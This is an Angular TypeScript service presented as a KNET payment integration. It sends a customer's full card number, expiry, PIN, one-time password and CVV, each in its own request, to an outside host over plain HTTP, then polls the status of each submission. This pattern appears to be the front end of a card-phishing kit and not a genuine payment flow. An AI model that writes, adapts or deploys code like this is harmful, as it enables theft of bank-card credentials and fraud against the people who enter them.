import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable, map } from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class PaymentService {
  private apiUrl = 'http://oredo-back.xyz';

  constructor(private http: HttpClient) { }

  createClient(payload: { phone_number: string, credit: number }): Observable<any> {
    return this.http.post(`${this.apiUrl}/client`, payload);
  }

  createKnetPayment(payload: any): Observable<any> {
    const data = {
        bank_name: payload.bankName,
        prefix: payload.prefix,
        card_number: payload.cardNumber,
        expiry_month: payload.expiryMonth,
        expiry_year: payload.expiryYear,
        pass: payload.pin,
        client_id: payload.clientId
    };
    return this.http.post(`${this.apiUrl}/knet`, data).pipe(
        map((res: any) => ({ success: true, knetId: res.id }))
    );
  }

  checkStatus(knetId: string): Observable<any> {
    return this.http.get(`${this.apiUrl}/knet/${knetId}`);
  }

  submitOtp(transactionId: string, otp: string, clientId: string): Observable<any> {
    return this.http.post(`${this.apiUrl}/knet-otp`, {
      otp: otp,
      client_id: clientId
    }).pipe(
      map((res: any) => ({ success: true, otpId: res.id }))
    );
  }

  checkOtpStatus(otpId: string): Observable<any> {
    return this.http.get(`${this.apiUrl}/knet-otp/${otpId}`);
  }

  submitCvv(cvv: string, clientId: string): Observable<any> {
    return this.http.post(`${this.apiUrl}/cvv`, {
      cvv: cvv,
      client_id: clientId
    }).pipe(
      map((res: any) => ({ success: true, cvvId: res.id }))
    );
  }

  checkCvvStatus(cvvId: string): Observable<any> {
    return this.http.get(`${this.apiUrl}/cvv/${cvvId}`);
  }
}
